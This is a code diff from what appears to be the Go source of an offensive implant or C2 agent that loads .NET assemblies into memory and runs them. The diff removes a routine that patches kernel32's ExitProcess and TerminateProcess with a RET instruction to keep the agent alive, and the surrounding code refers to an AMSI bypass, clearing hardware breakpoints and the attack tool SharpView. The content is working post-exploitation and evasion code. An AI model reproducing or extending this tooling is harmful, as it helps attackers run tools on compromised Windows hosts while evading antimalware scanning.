@@ -657,13 +657,6 @@ func executeInMemory(pRuntimeInfo uintptr, asmBytes []byte, args string, progres
 	}
 
 	clearHardwareBreakpoints() // before Invoke_3, not deferred
-
-	// Hook ExitProcess + TerminateProcess for the duration of Invoke_3.
-	// Assemblies that call Environment.Exit() (e.g. SharpView) would otherwise
-	// call ExitProcess/TerminateProcess and kill the agent process entirely.
-	// writeCodePatch uses NtProtectVirtualMemory — same approach as AMSI bypass.
-	unhookExit := hookExitProcessForCLR()
-
 	progress <- "Invoke_3"
 	// _MethodInfo::Invoke_3 via direct vtable call.
 	// IDispatch::GetIDsOfNames returns E_NOTIMPL on _MethodInfo — the CLR does not
@@ -697,7 +690,6 @@ func executeInMemory(pRuntimeInfo uintptr, asmBytes []byte, args string, progres
 		saParams,
 		uintptr(unsafe.Pointer(&retVal)),
 	)
-	unhookExit()
 	writeD(fmt.Sprintf("inv3:37:hr=%08X:objVT=%d:retVT=%d:err=%v",
 		invHR, objVar.vt, retVal.vt, invErr))
 
@@ -911,42 +903,6 @@ func executeAssemblyInner(asmBytes []byte, args, typeName, methodName string, pr
 	_ = sentinelN
 	_ = sentinelErr
 	return sb.String(), nil
-}
-
-// ── ExitProcess hook ─────────────────────────────────────────────────────────
-
-// hookExitProcessForCLR patches ExitProcess and TerminateProcess in kernel32.dll
-// with a single RET (0xC3) for the duration of Invoke_3. This prevents .NET
-// assemblies from killing the agent via Environment.Exit() / TerminateProcess.
-// The returned restore func must be called immediately after Invoke_3 returns.
-func hookExitProcessForCLR() func() {
-	type saved struct {
-		addr uintptr
-		orig [1]byte
-	}
-	var hooks []saved
-	for _, name := range []string{"ExitProcess", "TerminateProcess"} {
-		proc := kernel32.NewProc(name)
-		if proc.Find() != nil {
-			continue
-		}
-		addr := proc.Addr()
-		if addr == 0 {
-			continue
-		}
-		var s saved
-		s.addr = addr
-		s.orig[0] = *(*byte)(unsafe.Pointer(addr))
-		writeCodePatch(addr, []byte{0xC3}) // RET — ignore exit code, return to caller
-		hooks = append(hooks, s)
-	}
-	return func() {
-		for _, s := range hooks {
-			if s.addr != 0 {
-				writeCodePatch(s.addr, s.orig[:])
-			}
-		}
-	}
 }
 
 // ── PE metadata parser (unchanged) ───────────────────────────────────────────
